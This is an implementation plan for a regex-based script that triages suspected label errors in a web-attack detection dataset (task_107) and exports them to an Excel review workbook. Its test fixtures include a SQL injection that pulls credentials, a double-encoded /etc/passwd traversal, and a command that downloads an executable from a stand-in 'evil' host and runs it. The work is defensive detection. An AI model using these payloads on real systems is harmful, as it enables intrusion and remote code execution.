# Task 107 Label Review Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a regex-based, explainable triage script that analyzes all task_107 model-error rows, highlights high-confidence suspected label errors, and exports a three-sheet review workbook without changing source labels.

**Architecture:** A single focused Python module owns text normalization, rule matching, scoring, row analysis, and workbook export. Pure functions are tested independently before the CLI and Excel integration are added. Rules analyze only `payload`; the existing `提示词` column is preserved but excluded from matching.

**Tech Stack:** Python 3.10+, standard library (`argparse`, `dataclasses`, `html`, `re`, `urllib.parse`), `openpyxl`, `pytest`.

---

## File Structure

- Create `scripts/review_task_107_labels.py`: rule catalog, matching/scoring logic, Excel input/output, and CLI.
- Create `tests/test_review_task_107_labels.py`: unit and integration tests for signatures, decisions, validation, and workbook sheets.
- Create `outputs/lora-ckpt1200_aggregated_reports_20260730_150710/task_107_suite/sp_0729_qwen-3-6-27b-lora-ckpt1200/task_107_label_review.xlsx`: generated review artifact; not source-controlled.

### Task 1: Rule matching and decision policy

**Files:**
- Create: `tests/test_review_task_107_labels.py`
- Create: `scripts/review_task_107_labels.py`

- [ ] **Step 1: Write failing tests for normalization and strong signatures**

Add tests that import `analyze_row` and assert:

```python
def test_no_label_with_union_select_is_high_confidence_yes():
    result = analyze_row(
        payload="GET /search?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1",
        gold="No",
        model_output="Yes",
    )
    assert result["建议标签"] == "Yes"
    assert result["复核等级"] == "高置信疑似错标"
    assert "SQL注入" in result["规则类别"]


def test_double_encoded_path_traversal_is_detected():
    result = analyze_row(
        payload="GET /download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1",
        gold="No",
        model_output="Yes",
    )
    assert result["建议标签"] == "Yes"
    assert "路径遍历/文件包含" in result["规则类别"]


def test_command_download_execution_chain_is_detected():
    result = analyze_row(
        payload="POST /run HTTP/1.1\n\ncmd=wget http://evil/a -O /tmp/a; chmod +x /tmp/a; /tmp/a",
        gold="No",
        model_output="Yes",
    )
    assert result["建议标签"] == "Yes"
    assert "命令注入/代码执行" in result["规则类别"]
```

- [ ] **Step 2: Run tests and verify RED**

Run:

```bash
python -m pytest tests/test_review_task_107_labels.py -q
```

Expected: collection fails because `scripts.review_task_107_labels` does not exist.

- [ ] **Step 3: Implement minimal rule model and analysis functions**

Implement:

```python
@dataclass(frozen=True)
class Rule:
    name: str
    category: str
    pattern: re.Pattern[str]
    score: int
    strength: str
    description: str


def build_match_views(payload: str) -> list[str]:
    raw = payload.lower()
    html_decoded = html.unescape(raw)
    once = unquote(html_decoded)
    twice = unquote(once)
    return list(dict.fromkeys([raw, html_decoded, once, twice]))


def normalize_model_output(value: object) -> str:
    match = re.fullmatch(r"\s*(yes|no)\s*", str(value or ""), re.IGNORECASE)
    return match.group(1).title() if match else "Other"


def analyze_row(payload: str, gold: str, model_output: object) -> dict[str, object]:
    matches = match_rules(payload)
    score = sum(rule.score for rule, _ in matches)
    has_strong = any(rule.strength == "strong" for rule, _ in matches)
    if gold == "No" and has_strong:
        level, suggestion = "高置信疑似错标", "Yes"
    elif gold == "No" and score >= 4:
        level, suggestion = "中置信待复核", ""
    elif gold == "Yes" and has_strong:
        level, suggestion = "标签有攻击证据", "Yes"
    elif gold == "Yes":
        level, suggestion = "中置信待复核" if matches else "低置信待复核"
        suggestion = ""
    else:
        level, suggestion = "低置信/暂未发现错标证据", ""
    return {
        "规范化模型输出": normalize_model_output(model_output),
        "建议标签": suggestion,
        "复核等级": level,
        "风险分": score,
        "规则类别": "；".join(dict.fromkeys(rule.category for rule, _ in matches)),
        "命中证据": "；".join(f"{rule.name}: {evidence}" for rule, evidence in matches),
        "判断说明": build_explanation(gold, level, matches),
    }
```

Use strong rules for explicit SQL injection, shell execution, path traversal to sensitive targets, XSS execution contexts, webshell/code execution, JNDI/XXE, and unsafe deserialization. Use medium rules for suspicious admin paths, scanning user agents, CONNECT tunnels, suspicious extensions, and high encoded-character density.

- [ ] **Step 4: Run focused tests and verify GREEN**

Run:

```bash
python -m pytest tests/test_review_task_107_labels.py -q
```

Expected: all rule tests pass.

### Task 2: Guardrails against overclassification

**Files:**
- Modify: `tests/test_review_task_107_labels.py`
- Modify: `scripts/review_task_107_labels.py`

- [ ] **Step 1: Add failing tests for benign and uncertain samples**

Add:

```python
def test_normal_request_is_not_suggested_as_attack():
    result = analyze_row(
        payload="GET /assets/main.css HTTP/1.1\nHost: example.com",
        gold="No",
        model_output="Yes",
    )
    assert result["建议标签"] == ""
    assert result["复核等级"] == "低置信/暂未发现错标证据"


def test_yes_without_rule_hit_is_review_only_not_auto_no():
    result = analyze_row(
        payload="CONNECT 20.65.2.12:1706 HTTP/1.1",
        gold="Yes",
        model_output="No",
    )
    assert result["建议标签"] != "No"


def test_prompt_words_are_not_analyzed():
    result = analyze_row(
        payload="GET /health HTTP/1.1",
        gold="No",
        model_output="Yes",
    )
    assert "web attack" not in result["命中证据"].lower()


def test_verbose_answer_is_normalized_as_other():
    result = analyze_row(
        payload="GET / HTTP/1.1",
        gold="Yes",
        model_output="The answer is Yes because this is suspicious.",
    )
    assert result["规范化模型输出"] == "Other"
```

- [ ] **Step 2: Run tests and verify RED**

Run:

```bash
python -m pytest tests/test_review_task_107_labels.py -q
```

Expected: at least one guardrail test fails before the final threshold and output-normalization behavior is implemented.

- [ ] **Step 3: Implement guardrails**

Ensure:

- Only payload is passed to `match_rules`.
- A strong decision requires at least one strong rule.
- Lack of a rule never suggests changing `Yes` to `No`.
- Exact `Yes` or `No`, ignoring whitespace and case, is the only normalized valid output.
- Each rule contributes at most once even if it matches multiple decoded views.
- Match evidence is capped at 120 characters.

- [ ] **Step 4: Run tests and verify GREEN**

Run:

```bash
python -m pytest tests/test_review_task_107_labels.py -q
```

Expected: all unit tests pass.

### Task 3: Workbook export and CLI

**Files:**
- Modify: `tests/test_review_task_107_labels.py`
- Modify: `scripts/review_task_107_labels.py`

- [ ] **Step 1: Write failing workbook integration test**

Create a temporary workbook with `payload`, `标记`, `模型输出`, and `提示词`, invoke `review_workbook`, and assert:

```python
def test_review_workbook_creates_three_consistent_sheets(tmp_path):
    source = tmp_path / "input.xlsx"
    output = tmp_path / "output.xlsx"
    write_fixture_workbook(source)
    stats = review_workbook(source, output)

    workbook = load_workbook(output, read_only=True, data_only=True)
    assert workbook.sheetnames == ["全部错误_规则分析", "高置信疑似错标", "规则汇总"]
    assert workbook["全部错误_规则分析"].max_row == 4
    assert workbook["高置信疑似错标"].max_row == 2
    assert stats["input_rows"] == 3
    assert stats["high_confidence"] == 1
```

Also test that a workbook missing `模型输出` raises:

```python
with pytest.raises(ValueError, match="缺少必需列"):
    review_workbook(source, output)
```

- [ ] **Step 2: Run integration tests and verify RED**

Run:

```bash
python -m pytest tests/test_review_task_107_labels.py -q
```

Expected: fails because `review_workbook` is not implemented.

- [ ] **Step 3: Implement workbook and CLI**

Implement `review_workbook(input_path, output_path)` to:

- Validate required headers and Yes/No labels.
- Preserve original columns in original order.
- Append the seven analysis columns.
- Create the three specified sheets.
- Freeze header rows, enable filters, wrap long text, and apply readable column widths.
- Return counts for input rows and each review level.

Implement `main()` with:

```python
parser.add_argument("--input", type=Path, default=DEFAULT_INPUT)
parser.add_argument("--output", type=Path)
```

When `--output` is omitted, write `task_107_label_review.xlsx` beside the input file.

- [ ] **Step 4: Run all new tests**

Run:

```bash
python -m pytest tests/test_review_task_107_labels.py -q
```

Expected: all tests pass.

### Task 4: Real-data execution and verification

**Files:**
- Generate: `outputs/lora-ckpt1200_aggregated_reports_20260730_150710/task_107_suite/sp_0729_qwen-3-6-27b-lora-ckpt1200/task_107_label_review.xlsx`

- [ ] **Step 1: Run the script on the 491-row workbook**

Run:

```bash
python scripts/review_task_107_labels.py \
  --input outputs/lora-ckpt1200_aggregated_reports_20260730_150710/task_107_suite/sp_0729_qwen-3-6-27b-lora-ckpt1200/task_107_errors.xlsx
```

Expected: reports 491 input rows and prints the generated workbook path.

- [ ] **Step 2: Verify workbook counts and headers**

Open the generated workbook programmatically and verify:

- `全部错误_规则分析` contains 491 data rows.
- `高置信疑似错标` count equals the printed `high_confidence` count.
- `规则汇总` totals reconcile to 491.
- All source payloads, labels, model outputs, and prompts are unchanged.

- [ ] **Step 3: Run regression checks**

Run:

```bash
python -m pytest tests/test_review_task_107_labels.py -q
python -m compileall -q scripts/review_task_107_labels.py
git diff --check
```

Expected: tests pass, compilation succeeds, and no whitespace errors are reported.

- [ ] **Step 4: Commit implementation**

Run:

```bash
git add scripts/review_task_107_labels.py tests/test_review_task_107_labels.py
git commit -m "feat: add task 107 label review rules"
```

Do not add generated Excel files to the commit.
